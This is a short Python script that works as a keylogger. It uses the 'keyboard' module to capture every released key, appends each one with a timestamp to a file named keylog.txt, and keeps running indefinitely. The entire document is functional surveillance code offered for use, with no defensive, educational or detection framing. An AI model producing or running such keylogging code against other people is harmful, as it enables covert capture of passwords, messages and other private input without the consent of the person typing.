import keyboard  # Make sure to install the 'keyboard' module first (e.g., pip install keyboard)
import datetime

# Function to write the key pressed to a log file
def log_keys(event):
    with open("keylog.txt", "a") as logfile:
        logfile.write(f"{datetime.datetime.now()} - {event.name}\n")

# Start listening for key events
keyboard.on_release(log_keys)

# Keep the program running
keyboard.wait()
